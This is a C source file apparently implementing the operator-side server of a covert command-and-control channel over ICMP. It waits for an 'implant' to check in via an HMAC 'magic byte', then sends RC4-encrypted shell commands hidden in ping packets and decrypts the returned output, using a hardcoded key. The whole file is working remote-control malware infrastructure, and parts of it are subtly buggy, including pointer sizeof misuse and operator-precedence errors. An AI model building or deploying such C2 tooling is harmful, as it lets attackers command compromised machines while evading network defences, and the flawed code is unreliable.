#include "../include/c2.h"
#include "../include/rc4.h"

#define KEY "thisisapassword"
#define KEY_LENGTH 15
#define MAGIC_BYTE 0xaa

// creates a raw ICMP socket and binds it
int create_socket(char *interface_to_bind) {
    int sockfd;

    // create the raw ICMP socket
    if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        perror("socket()");
        exit(1);
    }

    // bind it to the interface if specified
    if (interface_to_bind != NULL) {
        if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, interface_to_bind, strlen(interface_to_bind)) < 0) {
            perror("setsockopt()");
            exit(1);
        }
    }

    return sockfd;
}

// calculate checksum (proudly? stolen from the internet)
unsigned short cksum(unsigned short *addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1) {
      sum += *w++;
      nleft -= 2;
    }

    if (nleft == 1) {
      *(unsigned char *)(&answer) = *(unsigned char *)w;
      sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return answer;
}

// get the input and return it's buffer
unsigned char *get_command(char *input) {
    unsigned char *cipher_text = (unsigned char *) malloc(BUFFER_SIZE);

    write(1, "> ", 2);
    fgets(input, BUFFER_SIZE, stdin);

    // encrypt the command
    RC4((unsigned char *) input, strlen(input), (unsigned char *) KEY, KEY_LENGTH, cipher_text);

    return cipher_text;
}

// read from the socket and write the data in a buffer, returns how much have been read
ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size) {
    ssize_t nbytes = read(sockfd, buffer, size);

    if (nbytes < 0) {
        return -1;
    }

    if (nbytes > 28) {
        return nbytes - 28;
    }
    return 0;
}

// check if we got an actual connection from our implant
int check_magic_byte(struct icmphdr *icmp) {
    // Generate HMAC-SHA256 of the ICMP packet using the shared key
    unsigned char digest[EVP_MAX_MD_SIZE];
    unsigned int digest_len;
    HMAC(EVP_sha256(), KEY, KEY_LENGTH, (unsigned char*)icmp, sizeof(*icmp), digest, &digest_len);

    // Check if the first byte of the HMAC matches the magic byte
    if (digest[0] == MAGIC_BYTE) {
        return 1;
    }
    return 0;
}

// print from where we got our connection
void print_connection_succeed(char *src_ip) {
        printf("[!] Got a connection from %s\n", src_ip);
        printf("[!] Now you should be able to run your commands\n");
}

// prep'ing the IP headers for later usage
struct sockaddr_in prep_ip_headers(struct iphdr *ip) {
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip->saddr;

    return addr;
}

// parse the data section
unsigned char *parse_data_section(unsigned char *packet) {
    // get the data section (ignoring the IP & ICMP headers)
    unsigned char *data = (unsigned char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));

    return data;
}

// append the command to the data section of the packet
void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *command) {
    memcpy(data, command, strlen(command));

    // update the ICMP header with the new data length
    icmp->un.echo.sequence = strlen(command);
}

// the actual interaction occurs here
void interact(int sockfd) {
    struct iphdr *ip; // holds the IP header
    struct icmphdr *icmp; // holds the ICMP header
    struct sockaddr_in addr; // holds the IP address
    unsigned char *packet; // holds the ICMP packet
    unsigned char *data; // holds the ICMP packet's data section
    unsigned char *cipher_text = malloc(BUFFER_SIZE);
    unsigned char *command;
    char *input; // holds the input buffer
    char src_ip[INET_ADDRSTRLEN]; // buffer to store the source IP (16 bytes)
    ssize_t nbytes, nbytes_tmp;
    size_t packet_size = sizeof(struct iphdr *) + sizeof(struct icmphdr *) + BUFFER_SIZE;
    int connected = 0;

    input = malloc(BUFFER_SIZE);
    packet = (unsigned char *) malloc(packet_size);

    if (input == NULL || packet == NULL) {
        fprintf(stderr, "Error: Cannot allocate memory\n");
        free(input);
        free(packet);
        return;
    }

    puts("[+] Waiting for connections...");

    while (!connected) {
        if ((nbytes_tmp = read_from_socket(sockfd, packet, packet_size) < 0)) {
            break;
        }

        if (nbytes_tmp != 0) {
            nbytes = nbytes_tmp;
        }

        ip = (struct iphdr *) packet;
        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

        if (check_magic_byte(icmp)) {
            // convert the binary represenation of the IP address to a string
            inet_ntop(AF_INET, &ip->saddr, src_ip, sizeof(src_ip));

            print_connection_succeed(src_ip);

            addr = prep_ip_headers(ip);

            data = parse_data_section(packet);

            command = get_command(input);

            append_to_data_section(icmp, data, command);

            nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(input), 0, (struct sockaddr *) &addr, sizeof(addr));
            if (nbytes < 0) {
                perror("sendto()");
                break;
            }

            connected = 1;
        }
    }

    while (connected) {
        if ((nbytes_tmp = read_from_socket(sockfd, packet, packet_size)) < 0) {
            break;
        }

        if (nbytes_tmp != 0) {
            nbytes = nbytes_tmp;
        }

        ip = (struct iphdr *) packet;
        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

        if (check_magic_byte(icmp)) {

            addr = prep_ip_headers(ip);

            data = parse_data_section(packet);

            // decrypt the cipher text (command's output)
            RC4(data, nbytes, (unsigned char *) KEY, KEY_LENGTH, cipher_text);

            write(1, cipher_text, nbytes);

            command = get_command(input);

            append_to_data_section(icmp, data, command);

            // we're using a stream cipher, and since length of input == cipher_text then we use strlen(input) instead
            nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(input), 0, (struct sockaddr *) &addr, sizeof(addr));
            if (nbytes < 0) {
                perror("sendto()");
                break;
            }
        }
    }
    free(input);
    free(cipher_text);
    free(packet);
}

// initializes the options and starts the c2
void c2_init_n_call(char *interface_to_bind) {
    int sockfd = create_socket(interface_to_bind);

    interact(sockfd);

    close(sockfd);
}
